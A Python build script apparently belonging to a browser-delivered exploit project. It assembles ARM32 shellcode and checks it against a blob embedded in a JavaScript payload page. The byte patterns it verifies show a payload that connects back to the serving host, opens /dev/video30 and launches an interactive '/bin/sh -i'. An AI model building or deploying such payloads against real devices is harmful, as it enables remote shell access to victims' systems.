"""Assemble tools/physrpc.S -> tools/physrpc_shellcode.bin (ARM32, position independent).

Two-pass assembly: data labels are referenced as `#OFF_<label>` placeholders.
Pass 1 fills them with 0 to get the layout, pass 2 uses the real offsets.
Instruction sizes do not depend on the immediate, so the layout is stable.

Requires keystone + capstone (pip install keystone-engine capstone).
The resulting blob must then be re-embedded in
server/payloads/browser_payload.js (manual step).

  python tools/build_physrpc.py                  # build the .bin
  python tools/build_physrpc.py --check-embedded # compare source vs the JS blob

The check exists because the shipped blob and this source drifted once: the blob
opened /dev/video30 while the source said video40, so a rebuild + re-embed would
have silently switched device nodes.  Run it after touching physrpc.S.
"""
import re
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC = HERE / "physrpc.S"
OUT = HERE / "physrpc_shellcode.bin"
JS = HERE.parent / "server" / "payloads" / "browser_payload.js"

PATTERNS = {
    "tag": b"PHYSRPC1\0",
    "forktag": b"PHYRFORK\0",
    # AF_INET, port 80, 192.0.2.1 (TEST-NET-1 placeholder; the page rewrites the
    # IP and the port from location.hostname/location.port before the copy)
    "sa": b"\x02\x00\x00\x50\xc0\x00\x02\x01",
    "path": b"/dev/video30\0",
    "hello": b"PGDB",
    "shpath": b"/bin/sh\0",
    "arg_i": b"-i\0",
}


def assemble(src: str) -> bytes:
    import keystone
    ks = keystone.Ks(keystone.KS_ARCH_ARM, keystone.KS_MODE_ARM)
    encoding, _ = ks.asm(src)
    return bytes(encoding)


def build_blob(template: str):
    """Two-pass assembly. Returns (blob, offsets) or (None, reason)."""
    ph = re.compile(r"#OFF_([a-z_]+)")

    # ---- pass 1: zero offsets, find the data by its bytes
    blob0 = assemble(ph.sub("#0", template))
    offs = {}
    for name, pat in PATTERNS.items():
        pos = blob0.find(pat)
        if pos < 0:
            return None, f"pass1: pattern for {name} not found (source/blob drift?)"
        offs[name] = pos
    # the header block follows arg_i, aligned to 4
    base = (offs["arg_i"] + len(PATTERNS["arg_i"]) + 3) & ~3
    offs["hdr"] = base
    offs["statusbuf"] = base + 16
    offs["argvbuf"] = base + 20
    offs["ts"] = base + 32
    offs["pathbuf"] = base + 40
    offs["databuf"] = base + 296
    offs["cmdbuf"] = base + 4392
    offs["runargv"] = base + 4904
    stack = (offs["runargv"] + 16 + 7) & ~7
    offs["stack_top"] = stack + 0x400
    if offs["stack_top"] != len(blob0):
        print(f"WARNING: computed stack_top 0x{offs['stack_top']:x} != blob len 0x{len(blob0):x}")

    # ---- pass 2: real offsets
    def repl(m):
        name = m.group(1)
        if name not in offs:
            raise KeyError(name)
        return f"#0x{offs[name]:x}"

    blob = assemble(ph.sub(repl, template))
    if len(blob) != len(blob0):
        return None, f"size changed {len(blob0)} -> {len(blob)}"
    return blob, offs


def embedded_blob():
    """The SHELLCODE array as shipped in browser_payload.js."""
    text = JS.read_text(encoding="utf-8", errors="replace")
    m = re.search(r"SHELLCODE\s*=\s*\[(.*?)\]", text, re.S)
    if not m:
        return None
    nums = [int(x, 0) for x in re.findall(r"0x[0-9a-fA-F]+|\b\d+\b", m.group(1))]
    return bytes(n & 0xFF for n in nums)


def check_embedded(blob: bytes) -> int:
    """Compare the assembled blob with the one the page actually runs."""
    shipped = embedded_blob()
    if shipped is None:
        print("[-] SHELLCODE not found in", JS)
        return 1
    if shipped == blob:
        print(f"OK: physrpc.S and the embedded blob are identical ({len(blob)} B)")
        return 0
    print(f"DIFF: source {len(blob)} B, embedded {len(shipped)} B")
    for i in range(min(len(blob), len(shipped))):
        if blob[i] != shipped[i]:
            print(f"  first difference at 0x{i:x}: source {blob[i]:02x} "
                  f"embedded {shipped[i]:02x}")
            lo = max(0, i - 16)
            print(f"  source   {blob[lo:i + 16]!r}")
            print(f"  embedded {shipped[lo:i + 16]!r}")
            break
    else:
        print("  common prefix identical; one blob is longer")
    return 1


def check_patterns() -> int:
    """Fallback check without keystone: the blob's literals must match the source.

    This is what catches the failure that actually happened (blob opens
    /dev/video30, source said video40); byte-identical comparison needs keystone.
    """
    shipped = embedded_blob()
    if shipped is None:
        print("[-] SHELLCODE not found in", JS)
        return 1
    src = SRC.read_text(encoding="ascii")
    bad = [name for name, pat in PATTERNS.items() if pat not in shipped]
    if bad:
        print(f"[-] embedded blob is missing: {', '.join(bad)}")
        return 1
    literals = ["PHYSRPC1", "PHYRFORK", "/dev/video30", "PGDB", "/bin/sh", "-i"]
    absent = [lit for lit in literals if lit not in src]
    if absent:
        print(f"[-] physrpc.S is missing: {', '.join(absent)} (source/blob drift)")
        return 1
    print(f"OK: pattern check passed ({len(shipped)} B embedded); keystone not "
          f"installed, so no byte-identical comparison")
    return 0


def main() -> int:
    template = SRC.read_text(encoding="ascii")
    try:
        blob, offs = build_blob(template)
    except ModuleNotFoundError as exc:
        if "--check-embedded" in sys.argv:
            print(f"[!] {exc.name} not installed - falling back to pattern check")
            return check_patterns()
        print(f"ERROR: {exc.name} missing (pip install -r tools/requirements.txt)")
        return 1
    if blob is None:
        print(f"ERROR: {offs}")
        return 1
    for k in sorted(offs):
        print(f"  {k:10s} 0x{offs[k]:04x}")

    if "--check-embedded" in sys.argv:
        return check_embedded(blob)

    OUT.write_bytes(blob)
    print(f"assembled {len(blob)} bytes (0x{len(blob):x}) -> {OUT}")

    # ---- verify every movw<label>/add pair resolves to the right data
    import capstone
    md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM)
    insns = list(md.disasm(blob, 0))
    checks = 0
    for i, ins in enumerate(insns):
        if ins.mnemonic != "movw":
            continue
        try:
            reg, imm = ins.op_str.split(", ")
            val = int(imm.lstrip("#"), 0)
        except Exception:
            continue
        # expect the next instruction to be `add reg, r12, reg`
        if i + 1 >= len(insns):
            continue
        nxt = insns[i + 1]
        if nxt.mnemonic != "add" or nxt.op_str not in (f"{reg}, r12, {reg}", f"{reg}, ip, {reg}"):
            continue
        tail = blob[val:val + 12]
        print(f"  {reg:>3} = base+0x{val:04x}  {tail!r}")
        checks += 1
    print(f"{checks} data references verified")
    return 0


if __name__ == "__main__":
    sys.exit(main())
